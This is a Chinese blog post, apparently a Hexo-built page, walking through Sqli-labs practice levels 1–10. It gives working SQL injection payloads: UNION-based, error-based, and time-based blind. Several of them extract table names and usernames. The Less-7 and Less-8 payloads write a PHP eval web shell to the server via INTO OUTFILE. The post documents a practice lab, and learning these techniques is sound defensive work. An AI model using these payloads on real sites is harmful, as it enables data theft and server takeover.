@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/fish.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/fish.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="鸡翅儿">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="考查点：UNION联合查询注入（Less-1-5）Less-1  首先看到题目要求传一个id参数，且为数字型因此传入?id=1开始测试，加单引号报错，两个单引号正常显示，判断为字符型注入 开始使用order by进行列数判断，oder by 3正常显示，order by 4报错，由此判断有三列使用 union 参数进行联合查询注入，union前面的参数报错才能执行union后面的数据，因此将 i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqli-labs闯关详解（1-10）">
+<meta property="og:url" content="http://wcute.github.io/2019/05/14/Sqli-labs闯关详解（1-10）/index.html">
+<meta property="og:site_name" content="鸡翅儿">
+<meta property="og:description" content="考查点：UNION联合查询注入（Less-1-5）Less-1  首先看到题目要求传一个id参数，且为数字型因此传入?id=1开始测试，加单引号报错，两个单引号正常显示，判断为字符型注入 开始使用order by进行列数判断，oder by 3正常显示，order by 4报错，由此判断有三列使用 union 参数进行联合查询注入，union前面的参数报错才能执行union后面的数据，因此将 i">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-642b2dde70081ed9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-5acbefb626815602.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-60fe8aac4f3b44c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-94e84fb9bbbe3a09.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-d58b8b1a70af30db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-e57a6427f7ee0cec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-90c39d9188d82167.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-1277f7feac98673c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-faf212cf0771d655.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-00548a2fdf79db11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-f2979c9e01a260c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-2801cb43d3e799a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-1a08fc4c053f7999.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-daa549e4111edb44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-2a9068d28a26a573.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-c4d170bbda0b9ad9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-40c8a16ddd276354.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-616a766068819163.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-b607dfaac729034e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-f9ef2ddfeb142dce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-ae58c041b7d9452e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-15d1c38dc7abc741.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-3e8bc827e800a61f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-547c63b52631e17d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-9d581439d91f8859.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-04bb39b9eba1513e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-a134d4f375534820.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-d07ff1a1d9565732.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-0d8dfc271300400e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-78377c070f8fca24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-13ae1373ded37e1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-0c906e23dace6bf7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-246367f5a91a09b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-05-14T11:52:00.698Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sqli-labs闯关详解（1-10）">
+<meta name="twitter:description" content="考查点：UNION联合查询注入（Less-1-5）Less-1  首先看到题目要求传一个id参数，且为数字型因此传入?id=1开始测试，加单引号报错，两个单引号正常显示，判断为字符型注入 开始使用order by进行列数判断，oder by 3正常显示，order by 4报错，由此判断有三列使用 union 参数进行联合查询注入，union前面的参数报错才能执行union后面的数据，因此将 i">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-642b2dde70081ed9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://wcute.github.io/2019/05/14/Sqli-labs闯关详解（1-10）/">
+
+
+
+
+
+  <title>Sqli-labs闯关详解（1-10） | 鸡翅儿</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">鸡翅儿</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2019/05/14/Sqli-labs闯关详解（1-10）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Sqli-labs闯关详解（1-10）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-14T19:23:00+08:00">
+                2019-05-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/靶场练习/" itemprop="url" rel="index">
+                    <span itemprop="name">靶场练习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ul>
+<li>考查点：UNION联合查询注入（Less-1-5）<h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4></li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-642b2dde70081ed9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>首先看到题目要求传一个id参数，且为数字型<br>因此传入<code>?id=1</code>开始测试，<br><img src="https://upload-images.jianshu.io/upload_images/12585049-5acbefb626815602.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>加单引号报错，两个单引号正常显示，判断为字符型注入<br><img src="https://upload-images.jianshu.io/upload_images/12585049-60fe8aac4f3b44c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
+<p>开始使用<code>order by</code>进行列数判断，<code>oder by 3</code>正常显示，<code>order by 4</code>报错，由此判断有三列<br>使用 union 参数进行联合查询注入，union前面的参数报错才能执行union后面的数据，因此将 id = 1 改为 id = -1 开始进行注入<br><img src="https://upload-images.jianshu.io/upload_images/12585049-94e84fb9bbbe3a09.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>如图，2,3为显示位，此时可在 2 或 3 的位置进行手注</p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>?id=-1&#39;union select 1,database(),3 --+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-d58b8b1a70af30db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
+<p>注表名<br><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-e57a6427f7ee0cec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
+<p>注某张表的字段，这里以users为例<br><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-90c39d9188d82167.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>?id=-1&#39; union select 1,group_concat(username),3 from security.users --+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1277f7feac98673c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"></p>
+<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p><img src="https://upload-images.jianshu.io/upload_images/12585049-faf212cf0771d655.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-00548a2fdf79db11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>加单引号报错， id=1 and 1=1 显示正常，id=1 and 1=2 显示页面更改，判断为整形注入<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f2979c9e01a260c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>依旧使用 oder by 判断列数，<code>oder by 3</code>正常显示，<code>order by 4</code>报错，故为四列</p>
+<p>与第一题差不多，把id=1后面的单引号去掉就可以了，直接放payload</p>
+<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>?id=-1 union select 1,database(),3 --+</code></p>
+<p>注表名<br><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</code></p>
+<p>注某张表的字段，这里以users为例<br><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>?id=-1 union select 1,group_concat(username),3 from security.users --+</code></p>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p><img src="https://upload-images.jianshu.io/upload_images/12585049-2801cb43d3e799a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>加单引号报错，报错信息多了一个括号，判断接收参数可能为id = (‘1’)，输入<code>id=1&#39;) --+</code> 页面正常显示，可以使用<code>order by</code> 进行判断注入<br><img src="https://upload-images.jianshu.io/upload_images/12585049-1a08fc4c053f7999.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"></p>
+<h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>?id=-1&#39;) union select 1,database(),3 --+</code></p>
+<p>注表名<br><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</code></p>
+<p>注某张表的字段，这里以users为例<br><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>?id=-1&#39;) union select 1,group_concat(username),3 from security.users --+</code></p>
+<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>和第三题差不多，判断传参格式应该是 id=(“1”)，所以将三题中的单引号换成双引号即可，直接放payload</p>
+<h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>?id=-1&quot;) union select 1,database(),3 --+</code></p>
+<p>注表名<br><code>?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</code></p>
+<p>注某张表的字段，这里以users为例<br><code>?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>?id=-1&quot;) union select 1,group_concat(username),3 from security.users --+</code></p>
+<ul>
+<li>考查点：双查询报错注入（Less-5，Less-6）<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4></li>
+</ul>
+<p>首先输入id=1，页面正常，加单引号报错，两个单引号页面正常显示，但均无输出部分，判断应该没有显示位，此时可尝试报错注入。</p>
+<p>常用的报错语句模板：</p>
+<ol>
+<li><p>通过floor报错<br>and (select 1 from (select count(<em>),concat((payload),floor (rand(0)</em>2))x from information_schema.tables group by x)a)<br>其中payload为你要插入的SQL语句<br>需要注意的是该语句将 输出字符长度限制为64个字符</p>
+</li>
+<li><p>通过updatexml报错<br>and updatexml(1,payload,1)<br>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
+</li>
+<li><p>通过ExtractValue报错<br>and extractvalue(1, payload)<br>输出字符有长度限制，最长32位。</p>
+</li>
+</ol>
+<p>这里使用第一种报错方式进行注入</p>
+<h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>?id=-1&#39; union select 1,count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x;--+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-daa549e4111edb44.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"></p>
+<p>注表名<br><code>?id=-1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-2a9068d28a26a573.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"></p>
+<p>注某张表的字段，这里以users为例<br><code>?id=-1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-c4d170bbda0b9ad9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>?id=-1&#39; union select 1,count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-40c8a16ddd276354.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"></p>
+<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p><img src="https://upload-images.jianshu.io/upload_images/12585049-616a766068819163.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>与第五题相似，题目已经提示双查询报错注入，字符串型。<br>所以直接放payload了，将第五题id=-1的单引号换成双引号即可</p>
+<h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>?id=-1&quot; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code></p>
+<p>注表名<br><code>?id=-1&quot; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code></p>
+<p>注某张表的字段，这里以users为例<br><code>?id=-1&quot; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>?id=-1&quot; union select 1,count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code></p>
+<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>首先拿 sqlmap 跑了一下，布尔盲注和时间延迟注入均可<br><img src="https://upload-images.jianshu.io/upload_images/12585049-b607dfaac729034e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-f9ef2ddfeb142dce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20.png"><br>思考：文章开头便提示使用 <code>outfile</code>，可以想到使用 mysql 写文件，比如写入一句话木马使用菜刀等工具连接</p>
+<p>尝试 <code>id=1&#39;</code>以及<code>id=1&#39; and 1=1 --+</code>报错，<br>继续尝试<code>id=1&quot; and 1=1 --+</code>页面正常<br><img src="https://upload-images.jianshu.io/upload_images/12585049-ae58c041b7d9452e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="21.png"><br>继续尝试<code>id=1&quot; and 1=2 --+</code>页面依旧正常说明<code>&quot;</code>并不能闭合<br><img src="https://upload-images.jianshu.io/upload_images/12585049-15d1c38dc7abc741.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="22.png"><br>继续尝试至<code>id=1&#39;)) and 1=1 --+</code>页面显示正常，<code>id=1&#39;)) and 1=2 --+</code>页面显示错误说明<code>and 1=2</code>语句被执行，闭合条件为 <code>id=1&#39;))</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-3e8bc827e800a61f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="23.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-547c63b52631e17d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="24.png"></p>
+<p>此时可以进行注入使用<code>outfile</code>写文件至 web 服务器<br>mysql 使用 into outfile 写文件需要写清<code>绝对路径</code>，可以使用<code>@@datadir</code>查询<code>数据库存储路径</code>，<code>@@basedir</code>查询<code>mysql安装路径</code>，这里可以利用之前几关进行查询一下。<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9d581439d91f8859.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="25.png"></p>
+<p>如图，将文件写入了本地的web服务器（文件必须是不存在的，否则写不进去）<br><img src="https://upload-images.jianshu.io/upload_images/12585049-04bb39b9eba1513e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="26.png"></p>
+<h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><p>使用mysql 写一句话木马<br><code>?id=-1&#39;)) union select 1,&#39;&lt;?php @eval($_POST[&quot;wcute&quot;]); ?&gt;&#39;,3 into outfile &quot;D:\\phpStudy\\WWW\\wcute.php&quot; --+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-a134d4f375534820.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="27.png"><br>使用菜刀连接<br><img src="https://upload-images.jianshu.io/upload_images/12585049-d07ff1a1d9565732.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="28.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-0d8dfc271300400e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="29.png"></p>
+<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>和第七关差不多，将id=1’))换成id=1’即可</p>
+<h5 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h5><p>使用mysql 写一句话木马<br><code>?id=-1&#39; union select 1,&#39;&lt;?php @eval($_POST[&quot;wcute&quot;]); ?&gt;&#39;,3 into outfile &quot;D:\\phpStudy\\WWW\\wcute.php&quot; --+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-78377c070f8fca24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="30.png"></p>
+<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p>输入<code>id=1</code>加单引号或者其他符号，页面一直没有变化，考虑试一下基于时间的延迟注入<br>使用burp多番测试后，测出payload为<code>?id=1&#39; and sleep(5) --+</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-13ae1373ded37e1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="31.png"><br>对数据库进行探测，由于之前已知数据库为<code>security</code>，<code>s</code>的ASCII值为<code>115</code><br>使用语句进行判断<br><img src="https://upload-images.jianshu.io/upload_images/12585049-0c906e23dace6bf7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="32.png"><br>返回时间延迟，证明第一个字段等于s，其余类似爆出其他字段</p>
+<h5 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h5><p>爆数据库第一个字母<br><code>?id=1&#39; and If(ascii(substr(database(),1,1))=115,1,sleep(5)) --+</code><br>爆第一个数据库(security)的第一个字母<br><code>?id=1&#39; and If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1) --+</code><br>爆当前数据库(security)的第一个表(emails)的第一个字母<br><code>?id=1&#39; and If(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1) --+</code><br>爆当前数据库(security)的第一个表(emails)的第二个字段(id)的第一个字母<br><code>?id=1&#39; and If(ascii(substr((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1,1))=105,sleep(5),1) --+</code></p>
+<p>附上sqlmap跑的结果<br><img src="https://upload-images.jianshu.io/upload_images/12585049-246367f5a91a09b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="33.png"></p>
+<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>和第十题类似，只需将单引号换成双引号，即<code>id=1&#39;</code>换成<code>id=1&quot;</code></p>
